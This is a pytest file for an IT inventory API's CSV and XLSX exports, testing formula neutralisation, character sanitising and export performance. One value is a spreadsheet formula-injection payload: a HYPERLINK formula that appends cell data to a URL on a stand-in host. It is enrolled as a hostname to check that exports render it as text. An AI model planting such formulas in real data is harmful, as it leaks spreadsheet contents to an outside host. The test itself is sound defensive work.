"""Spreadsheet exports never hand Excel a formula written by an agent."""

import io

import pytest
from openpyxl import load_workbook

from app.api.csv_export import neutralize
from app.api.xlsx_export import xlsx_bytes, xlsx_response
from tests.test_api_inventory import (  # noqa: F401  (fixtures come from conftest)
    _enroll,
    _heartbeat,
    _inventory,
)
from tests.test_api_inventory_fleet import _admin_headers, _poste

FORMULA = '=HYPERLINK("https://x.invalid/?"&A2,"ouvrir")'


@pytest.mark.parametrize("value", ["=1+1", "+1", "-1", "@SUM(A1)", "\t=1", "\r=1"])
def test_neutralize_prefixes_formula_triggers(value: str):
    assert neutralize(value) == "'" + value


@pytest.mark.parametrize("value", ["PC-01", "Windows 11", "", "1-2", 42, -3])
def test_neutralize_leaves_plain_values_alone(value: object):
    assert neutralize(value) == value


def test_neutralize_turns_none_into_an_empty_cell():
    assert neutralize(None) == ""


def test_xlsx_drops_control_characters_instead_of_failing():
    """Audit S11: one control character reported by an agent (a software
    publisher, a hostname) must not turn the whole export into a 500."""
    body = xlsx_bytes(["Nom"], [["Contoso\x00\x1bLtd\x07"], ["ok\tlà"]])
    sheet = load_workbook(io.BytesIO(body)).active
    assert sheet is not None
    assert sheet["A2"].value == "ContosoLtd"
    assert sheet["A3"].value == "ok\tlà"


def test_xlsx_drops_what_xml_cannot_carry_and_openpyxl_lets_through():
    """Audit S11 (T12): U+FFFE, U+FFFF and lone surrogates are not in
    openpyxl's pattern; written, the workbook would not open again."""
    body = xlsx_bytes(["Nom"], [["A\ufffeB\uffffC"], ["D\ud800E"], ["ok \U0001f600"]])
    sheet = load_workbook(io.BytesIO(body)).active
    assert sheet is not None
    assert sheet["A2"].value == "ABC"
    assert sheet["A3"].value == "DE"
    assert sheet["A4"].value == "ok \U0001f600"


async def test_xlsx_writes_a_formula_looking_string_as_text():
    """openpyxl would store ``=...`` as a formula; the cell must stay text."""
    resp = await xlsx_response("t.xlsx", ["Nom", "N"], [[FORMULA, 3]])
    sheet = load_workbook(io.BytesIO(resp.body)).active
    assert sheet is not None
    cell = sheet["A2"]
    assert cell.data_type == "s"
    assert cell.value == FORMULA
    assert sheet["B2"].value == 3


async def test_csv_export_neutralizes_an_agent_hostname(client, db_session):
    """End to end: a poste naming itself a formula exports as text."""
    headers = await _admin_headers(client, db_session)
    await _poste(client, "exp-inject", hostname=FORMULA)

    resp = await client.get(
        "/api/v1/machines/export.csv?columns=hostname", headers=headers
    )
    assert resp.status_code == 200, resp.text
    cell = resp.text.lstrip("﻿").splitlines()[1]
    assert cell.startswith("\"'=HYPERLINK")


@pytest.mark.parametrize(
    ("path", "expected"),
    [
        ("/api/v1/machines/export.xlsx?columns=hostname", "PC-01"),
        ("/api/v1/software/export.xlsx", "Outil"),
    ],
)
async def test_an_xlsx_export_with_a_non_character_reloads(
    client, db_session, path, expected
):
    """End to end (T12): a hostname and a software name carrying U+FFFE and
    U+FFFF, accepted by the heartbeat and PostgreSQL, export to a workbook
    openpyxl loads again."""
    headers = await _admin_headers(client, db_session)
    await _poste(
        client,
        "exp-nonchar",
        hostname="PC\ufffe-01\uffff",
        software=[{"name": "Outil\uffff", "version": "1\ufffe", "publisher": "X"}],
    )
    resp = await client.get(path, headers=headers)
    assert resp.status_code == 200, resp.text
    sheet = load_workbook(io.BytesIO(resp.content)).active
    assert sheet is not None
    values = [c.value for row in sheet.iter_rows(min_row=2) for c in row]
    assert expected in values


def test_the_xlsx_export_grows_linearly_with_its_rows():
    """Solidity pass: the row number was read back from the sheet for every
    cell (``max_row`` walks every cell written), which made the export
    quadratic — 10 s for 1,500 postes, 89 s with every column, the API frozen
    meanwhile. Four times the rows must cost about four times the time."""
    import time
    from datetime import UTC, datetime

    def timed(n: int) -> float:
        rows = [
            [
                f"PC-{i:05d}",
                "10.0.0.1",
                datetime(2026, 1, 1, tzinfo=UTC).replace(tzinfo=None),
            ]
            + [f"valeur {j}" for j in range(17)]
            for i in range(n)
        ]
        start = time.perf_counter()
        xlsx_bytes([f"C{j}" for j in range(20)], rows)
        return time.perf_counter() - start

    small, large = timed(400), timed(1600)
    assert large < small * 8, (small, large)


async def test_the_xlsx_export_leaves_the_api_answering(
    client, db_session, monkeypatch
):
    """The workbook is built off the event loop: a request sent while an
    export is being built is answered at once."""
    import asyncio
    import time

    from app.core.config import settings

    # 300 enrolments from one test address: past the enrolment limiter.
    monkeypatch.setattr(settings, "RATE_LIMIT_ENABLED", False)
    headers = await _admin_headers(client, db_session)
    for i in range(300):
        await _poste(client, f"exp-load-{i}", hostname=f"PC-{i:04d}")

    export = asyncio.create_task(
        client.get("/api/v1/machines/export.xlsx", headers=headers)
    )
    await asyncio.sleep(0.05)
    start = time.perf_counter()
    policy = await client.get("/api/v1/auth/password-policy")
    answered_in = time.perf_counter() - start
    resp = await export
    assert resp.status_code == 200
    assert policy.status_code == 200
    assert answered_in < 2.0, answered_in
